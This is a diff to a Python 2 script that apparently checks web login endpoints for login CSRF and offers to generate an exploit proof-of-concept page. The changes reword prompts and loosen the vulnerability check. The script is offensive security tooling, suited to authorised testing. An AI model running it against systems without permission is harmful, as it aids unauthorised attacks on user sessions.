@@ -1,3 +1,5 @@
+#!/bin/env/python2.7
+
 import requests
 import sys
 
@@ -65,7 +67,7 @@ parameter_list = []
 value_list = []
 cookies = {}
 
-target = raw_input(colors.fg.orange + "Enter the target:" + colors.reset)
+target = raw_input(colors.fg.orange + "Enter the target(eg: domain.com/vulnendpoint):" + colors.reset)
 if "https://" in target:
 	pass
 elif "http://" in target:
@@ -84,11 +86,12 @@ for i in range(variables):
 
 i=0
 for i in range(variables):
-	print colors.fg.cyan + "Enter" + " " + parameter_list[i] + ":" + colors.reset
+	print colors.fg.cyan + "Enter the vaue of " + parameter_list[i] + ":" + colors.reset
 	temp = raw_input()
 	value_list.append(temp)
 	POC_content.append(POC_init.format(parameter_list[i], value_list[i]))
 
+print colors.fg.blue + "[+] Verifying the beahviour" + colors.reset
 
 for i in range(variables):
 	cookies[parameter_list[i]] = value_list[i]
@@ -101,21 +104,20 @@ except Exception:
 			*Recheck the target entered''' + colors.reset
 	exit(0)
 
-
 flag = 0
 if post_request.status_code == 200:
 	for i in range(variables):
 		if value_list[i] in post_request.text:
 			flag = flag + 1
 		else:
-			print colors.fg.red + "[-] Exploit failed!" + colors.reset
-			print colors.fg.red + "[-] Not vulnerable to CSRF login!" + colors.reset
-			choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
-			choicecheck(choice, target,variables,POC_content)
+			pass
+	print colors.fg.red + "[?] Unable to determine whether vulnerable!" + colors.reset
+	print colors.fg.red + "[-] Verfiy manually!\n" + colors.reset
+	choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
+	choicecheck(choice, target,variables,POC_content)
 
 
-if flag == variables:
-	print colors.fg.green + "[+] Exploit successfull!" + colors.reset
+if flag != 0:
 	print colors.fg.green + "[+] Vulnerable to CSRF login!" + colors.reset
 	choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
 	choicecheck(choice, target,variables,POC_content)
@@ -124,7 +126,3 @@ else:
 	print colors.fg.red + "[-] Verfiy manually!\n" + colors.reset
 	choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
 	choicecheck(choice, target,variables,POC_content)
-
-
-
-
